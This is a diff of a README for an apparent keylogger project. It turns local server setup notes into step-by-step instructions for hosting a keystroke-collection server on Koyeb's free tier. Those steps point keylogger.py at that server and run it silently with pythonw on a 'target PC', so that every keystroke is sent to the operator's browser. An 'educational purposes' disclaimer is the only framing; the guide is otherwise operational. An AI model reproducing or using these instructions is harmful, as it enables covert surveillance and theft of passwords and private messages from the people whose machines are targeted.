@@ -1,19 +1,70 @@
-# Very Basic Express Server with a Resource for Logging Keystrokes
+# Using Koyeb free clould for Keylogging.
 
-## This code DOES NOT promote or encourage any illegal activities! The content in this document is provided solely for educational purposes and to create awareness!
+## This code does not support or encourage any illegal activities. It is intended solely for educational purposes and to raise awareness.
 
-## This is a proof of concept and could be improved on in a lot of ways.
+## This is a proof of concept and has significant potential for improvement.
 
-1. To run this code use `git clone https://github.com/davidbombal/express-server-basic.git`
-2. Run the command `cd/express-server-keylogger-basic`
-3. Run the command `python3 setup.py`. This will do the basic setup on the Ubuntu server. It will install NodeJS, Node Package Manager (NPM) and also install all the modules required such as the Express web framework, the body-parser middleware used by Express.
-4. Run the command `node server.js` to start the server on port ***8080***
+**Instructions for Deploying and Running the Keylogger via GitHub Repository**
 
-You can use the GET and POST methods on the "/" endpoint.
-- GET will show the keylogger data written to the server, with every page refresh.
-- POST will write the data with the body
-  `{
-      keyboardData: <what user entered>
-   }`
-   
-This is a little bare bones project that shows with little effort how powerful a few lines of server side JavaScript using Node can be. It can be improved with the addition of a database such as MongoDB paired with a module such as Mongoose (To validate and structure API input). Also, the addition of update, and remove operations would be quite easy to implement. I also didn't implement good exception handling for this project.   
+### Step 1: Fork the GitHub Repository and Set Up a Service
+
+- Visit the GitHub repository and fork it to your account.
+- Go to [Koyeb](https://www.koyeb.com/) and create a free account.
+- Use your forked GitHub repository to create a new service.
+
+### Step 2: Configure the Buildpack
+
+- During the service creation process, click on "Configure Buildpack."
+
+### Step 3: Set the Build Command
+
+- Enter the following build command:
+  ```
+  npm install
+  ```
+
+### Step 4: Set the Run Command
+
+- Enter the following run command:
+  ```
+  node server.js
+  ```
+
+### Step 5: Expose Ports
+
+- Select the "Exposed Ports" option.
+- Change the "Port" value to **8080**.
+- Click on **Deploy**.
+
+### Step 6: Copy the Deployment URL
+
+- Once the deployment is successful, copy the service URL displayed on Koyeb.
+- The URL will end with **"koyeb.app/"**.
+
+### Step 7: Open the Service URL
+
+- Open the copied URL in your browser to verify the deployment.
+
+### Step 8: Update the Keylogger Script
+
+- Open the `keylogger.py` file in your forked repository.
+- Replace `SERVER_URL` with your deployed Koyeb service URL:
+  ```python
+  SERVER_URL = "<Your server URL>"
+  ```
+
+### Step 9: Run the Keylogger on Another PC
+
+- Ensure Python is installed on the target PC.
+- Open the **Command Prompt** and navigate to the directory where `keylogger.py` is stored using the `cd` command.
+- Run the following command:
+  ```
+  pythonw keylogger.py
+  ```
+
+### Step 10: Start Capturing Keystrokes
+
+- Once executed, all keystrokes from the target PC will be sent to your deployed service and can be viewed in your browser.
+
+**Note:** Ensure that Python is pre-installed on the target PC before executing the script.
+
